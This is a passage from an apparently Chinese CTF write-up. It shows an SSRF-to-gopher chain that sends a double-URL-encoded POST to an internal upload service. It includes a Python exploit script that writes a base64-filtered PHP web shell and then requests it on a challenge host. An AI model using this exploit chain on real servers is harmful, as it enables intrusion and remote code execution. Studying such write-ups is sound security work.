</span></span><span style="display:flex;"><span>			&lt;<span style="color:#f92672">p</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;lead&#34;</span>&gt;
</span></span><span style="display:flex;"><span>				Since there is only one administrator, a person can only submit one opinion at a time.
</span></span><span style="display:flex;"><span>				Each time a new opinion is submitted, all old comments will be deleted
</span></span><span style="display:flex;"><span>				&lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;
</span></span><span style="display:flex;"><span>                &lt;/<span style="color:#f92672">p</span>&gt;
</span></span><span style="display:flex;"><span>		&lt;/<span style="color:#f92672">div</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		&lt;<span style="color:#f92672">br</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;row&#34;</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text-align:center;vertical-align:middle;&#34;</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;form-inline&#34;</span>&gt;
</span></span><span style="display:flex;"><span>				&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;form-group&#34;</span>&gt;
</span></span><span style="display:flex;"><span>					&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;form-control&#39;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;file&#34;</span>&gt;
</span></span><span style="display:flex;"><span>	&lt;/<span style="color:#f92672">div</span>&gt;
</span></span><span style="display:flex;"><span>					&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;panel-body&#39;</span>&gt;
</span></span><span style="display:flex;"><span>						&lt;<span style="color:#f92672">textarea</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;form-control&#39;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;content&#39;</span> <span style="color:#a6e22e">rows</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;6&#39;</span>&gt;&lt;/<span style="color:#f92672">textarea</span>&gt;
</span></span><span style="display:flex;"><span>						&lt;<span style="color:#f92672">br</span>&gt;
</span></span><span style="display:flex;"><span>						&lt;<span style="color:#f92672">br</span>&gt;
</span></span><span style="display:flex;"><span>						&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;form-group&#34;</span>&gt;
</span></span><span style="display:flex;"><span>							&lt;<span style="color:#f92672">button</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;btn btn-default col-md-2 form-control&#39;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Submit&#34;</span>&gt;Submit&lt;/<span style="color:#f92672">button</span>&gt;
</span></span><span style="display:flex;"><span>						&lt;/<span style="color:#f92672">div</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			&lt;/<span style="color:#f92672">form</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		&lt;/<span style="color:#f92672">div</span>&gt;
</span></span></code></pre></div><p>同时</p>
<p>http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=http://127.0.0.1:40000/uploads/</p>
<p>可以访问, 那么这里应该是上传东西到目录下面了.这里使用gopher协议来发送post上传文件, 这里依然会有一个过滤, 包括等号在内的几种符号和字母组合都被过滤了,使用二次编码协议来绕过.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">import</span> <span style="color:#a6e22e">requests</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">from</span> <span style="color:#a6e22e">urllib</span><span style="color:#f92672">.</span><span style="color:#a6e22e">parse</span> <span style="color:#a6e22e">import</span> <span style="color:#a6e22e">urlencode</span>, <span style="color:#a6e22e">quote_plus</span>, <span style="color:#a6e22e">quote</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">url0</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=gopher://127.0.0.1:40000/_&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">upload_data</span> <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;file&#39;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;php://filter/convert.base64-decode|convert.base64-decode/resource=shell.php&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;content&#39;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;UEQ4OVlHTmhkQ0F2Wm14aFoyQTc&#39;</span> <span style="color:#75715e"># 似乎可以正常解密的base64都无法写入文件中
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">upload_data</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">urlencode</span>(<span style="color:#a6e22e">upload_data</span>, <span style="color:#a6e22e">quote_via</span><span style="color:#f92672">=</span><span style="color:#a6e22e">quote_plus</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">print</span>(<span style="color:#a6e22e">upload_data</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">gopher_content</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;POST / HTTP/1.1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Host: 127.0.0.1:40000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Cookie: PHPSESSID=hhhhhhhhhhhhhhhhhhhhhhhaaa;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Connection: close
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Content-Type: application/x-www-form-urlencoded
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Content-Length: {length}
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">{data}&#39;&#39;&#39;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">format</span>(<span style="color:#a6e22e">length</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">len</span>(<span style="color:#a6e22e">upload_data</span>), <span style="color:#a6e22e">data</span><span style="color:#f92672">=</span><span style="color:#a6e22e">upload_data</span>)<span style="color:#f92672">.</span><span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#39;\n&#39;</span>, <span style="color:#e6db74">&#39;\r\n&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#  ssrf need double url encode
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">url0</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">quote</span>(<span style="color:#a6e22e">quote</span>(<span style="color:#a6e22e">gopher_content</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">header</span> <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;Upgrade-Insecure-Requests&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;1&#34;</span>, <span style="color:#e6db74">&#34;User-Agent&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36&#34;</span>, <span style="color:#e6db74">&#34;Accept&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#34;</span>, <span style="color:#e6db74">&#34;Accept-Encoding&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;gzip, deflate&#34;</span>, <span style="color:#e6db74">&#34;Accept-Language&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&#34;</span>, <span style="color:#e6db74">&#34;Connection&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;close&#34;</span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">requests</span><span style="color:#f92672">.</span><span style="color:#a6e22e">get</span>(<span style="color:#a6e22e">url</span>, <span style="color:#a6e22e">headers</span><span style="color:#f92672">=</span><span style="color:#a6e22e">header</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">validate</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=http://127.0.0.1:40000/uploads/hhhhhhhhhhhhhhhhhhhhhhhaaa/shell.php
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">res = requests.get(validate)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">print(res.content)
</span></span></span></code></pre></div><p><img loading="lazy" src="image-20211114142011268.png" alt="image-20211114142011268"  />
</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="http://dragonbox.top/posts/ctf-gactf2020/">
    <span class="title">« Prev</span>
    <br>
    <span>GACTF2020</span>
  </a>
  <a class="next" href="http://dragonbox.top/posts/sec-http-smuggling/">
    <span class="title">Next »</span>
    <br>
    <span>http请求走私笔记</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2024 <a href="http://dragonbox.top/">ch3n9w の 超元域</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
